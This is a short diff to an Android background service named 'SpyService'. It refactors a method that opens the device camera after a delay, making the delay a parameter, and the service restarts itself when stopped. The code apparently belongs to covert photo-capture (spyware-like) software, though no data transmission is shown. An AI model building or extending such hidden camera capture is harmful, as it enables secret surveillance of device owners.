@@ -14,7 +14,7 @@ public class SpyService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        take();
+        takeDelayedPhoto(4000);
         return START_STICKY;
     }
 
@@ -23,18 +23,18 @@ public class SpyService extends Service {
         return null;
     }
 
-    private void take() {
+    private void takeDelayedPhoto(int delay) {
         new Handler().postDelayed(new Runnable() {
             @Override
             public void run() {
                 try {
                     mCamera = Camera.open();
-                    mCameraSurface = new CameraSurface(SpyService.this, mCamera);
+                    mCameraSurface = new CameraSurface(getApplicationContext(), mCamera);
                     mCameraSurface.create();
                 } catch (RuntimeException e) {
                     e.printStackTrace();
                 }
             }
-        }, 10000);
+        }, delay);
     }
 }
